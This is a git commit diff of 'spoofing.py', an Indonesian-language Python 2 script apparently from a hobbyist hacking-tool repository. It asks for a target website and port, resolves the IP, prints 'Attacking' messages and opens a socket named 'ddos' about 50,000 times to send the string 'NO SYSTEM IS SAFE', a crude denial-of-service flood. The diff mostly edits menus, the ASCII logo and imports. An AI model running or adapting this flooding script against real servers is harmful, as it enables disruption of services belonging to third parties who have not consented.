488b38a61c511a89fd2258226ff4b74b88f50534
Step By Step <52529306+stepbystepexe@users.noreply.github.com>
2020-03-05 22:30:59 +0700

    Update spoofing.py

--- spoofing.py
+++ spoofing.py
@@ -4,8 +4,8 @@
 # Coded by Nedi Senja
 # Github: https://github.com/stepbystepexe/Spoofing
 
-from __opt__ import *
-import os, sys, time, string, socket, marshal
+import os, sys, time, string, socket
+from time import sleep
 
 info = """
 Nama        : Spoofing
@@ -25,7 +25,13 @@ NB          : Manusia gax ada yang sempurna
 
 [ \033[4mGunakan tool ini dengan bijak \033[0m]\n """
 
-example = """\033[0;102;90;1m[        e-Mail Spoof, My Github: @stepbystepexe        ]\033[0m"""
+example = """\033[0;102;90;1m[           Spoofing, My Github: @stepbystepexe          ]\033[0m"""
+
+logo = """
+\033[0;31m▀▀▀▀▀ \033[0;34m█▀▀▀▀ █▀▀▀█ █▀▀▀█ █▀▀▀█ █▀▀▀▀ ▀█▀ █▀▀▀█ █▀▀▀▀ \033[0;31m▀▀▀▀▀
+\033[0;37m▀▀▀▀▀ \033[0;34m▀▀▀▀█ █▀▀▀▀ █   █ █   █ █▀▀▀▀  █  █   █ █   █ \033[0;37m▀▀▀▀▀
+\033[0;31m▀▀▀▀▀ \033[0;34m▀▀▀▀▀ ▀     ▀▀▀▀▀ ▀▀▀▀▀ ▀     ▀▀▀ ▀   ▀ ▀▀▀▀▀ \033[0;31m▀▀▀▀▀
+"""
 
 def restart():
     python = sys.executable
@@ -33,10 +39,10 @@ def restart():
     curdir = os.getcwd()
 
 def loads():
-    x = [
+    o = [
      '.   ', '..  ', '... ']
-    for o in x:
-        print '\r\x1b[0m[\x1b[94;1m\xe2\x97\x8f\x1b[0m] \x1b[0mMemulai ' + o,
+    for i in o:
+        print '\r\x1b[0m[\x1b[94;1m\xe2\x97\x8f\x1b[0m] \x1b[0mMemulai ' +i,
         sys.stdout.flush()
         time.sleep(1)
 
@@ -48,31 +54,43 @@ def write(o):
 
 os.system('clear')
 os.system('reset')
-time.sleep(1)
+sleep(1)
 print
 print(logo)
 print(example)
 print
-print("\033[0m[\033[1;96mあ\033[0m] \033[1;77mMulai Menggunakan Spoofing")
+print("\033[0m[\033[1;96;2m1\033[0m] \033[1;77mKirim Paket Spoof")
 print
 print("\033[0m[\033[93;1m&\033[0m] LISENSI")
 print("\033[0m[\033[94;1m#\033[0m] Informasi")
 print("\033[0m[\033[92;1m*\033[0m] Perbarui")
 print("\033[0m[\033[91;1m-\033[0m] Keluar")
 print
-option = raw_input("\033[0m[\033[1;95m/\033[0m] \033[1;77mMasukan opsi: \033[0m")
-if option.strip() in 'あ 1 gunakan'.split():
+option = raw_input("\033[0m(\033[105;77;1m/\033[0m) \033[1;77mMasukan opsi: \033[0m")
+if option.strip() in '1 kirim'.split():
+    write("\n\033[0m[\033[32m●\033[0m] \033[77;1mSedang memproses ...\033[0m")
+    sleep(1)
+    os.system('clear')
+    os.system('reset')
+    sleep(1)
     print
-    host = raw_input("\033[0m[\033[95;1m+\033[0m] \033[77;1mMasukan Web Target: \033[0m")
-    port = input("\033[0m[\033[92;1m+\033[0m] \033[77;1mMasukan Port: \033[0m")
+    print(logo)
+    print(example)
+    print
+    write("\033[0m[ \033[32mINFO \033[0m] \033[3mSaya tidak real kalo code program saya ini ditiru")
+    write("         Seburuk apaun itu tolong hargai karya milik orang\033[0m\n")
+    print
+    host = raw_input("\033[0m[\033[105;77;1m Websit \033[0m] ")
+    port = input("\033[0m[\033[103;90;1m  Port  \033[0m] ")
     connect=50000
     ip = socket.gethostbyname( host )
-    write ("\033[0m[\033[91;1m!\033[0m] \033[77;1mMengecek ...")
+    write("\n\033[0m[\033[91;1m!\033[0m] \033[77;1mMengecek Web Server ...")
+    sleep(3)
     print
-    print ("\033[0m[\033[96;1m*\033[0m] Attacking \033[1;77m[" + host + "]")
-    time.sleep(3)
-    print ("\033[0m[\033[93;1m*\033[0m] Attack ke IP \033[1;77m["+ ip + "]")
-    time.sleep(3)
+    print("\033[0m[\033[96;1m*\033[0m] Attacking \033[1;77m[" + host + "]")
+    sleep(3)
+    print("\033[0m[\033[93;1m*\033[0m] Attack ke IP \033[1;77m["+ ip + "]")
+    sleep(3)
     message=("NO SYSTEM IS SAFE")
     print
     loads()
@@ -89,7 +107,7 @@ elif option.strip() in '# 3 info'.split():
     print(example)
     os.system('toilet -f smslant Spoof')
     print(info)
-    time.sleep(1)
+    sleep(1)
     print
     raw_input('[ Tekan Enter ]')
     restart()
@@ -97,16 +115,16 @@ elif option.strip() in '* 4 perbarui'.split():
     print
     os.system('git pull origin master')
     print
-    raw_input('\033[0m[ \033[92mTekan Enter \033[0m]')
+    raw_input('\033[0m[ \033[32mTekan Enter \033[0m]')
     restart()
-elif option.strip() in '- keluar 0'.split():
+elif option.strip() in '- 0 keluar'.split():
     print("\n\033[0m[\033[1;91m!\033[0m] \033[1;77mKeluar dari program!")
     print
     sys.exit(1)
 else:
     print("\n\033[0m[=\033[1;41;77m Pilihan Salah \033[0m=]")
     print
-    time.sleep(1)
+    sleep(1)
     restart()
 
 def spoof():
@@ -118,7 +136,7 @@ def spoof():
         ddos.send( message );
     except socket.error, msg:
         print("\033[0m[\033[91;1m!\033[0m] \033[77;1mTidak ada koneksi \033[0m [" + ip + "]")
-    write ( "\033[0mMengirim [ \033[0;1;91mEMAIL\033[0m ] berhasil ke [ \033[0;1;2;96m" + ip + "\033[0m ]")
+    write ( "\033[0mPaket [ \033[91;1;2mSpoof\033[0m ] terkirim ke [ \033[0;1;2;96m" + ip + "\033[0m ]")
     ddos.close()
 for i in range(1, connect):
     spoof()
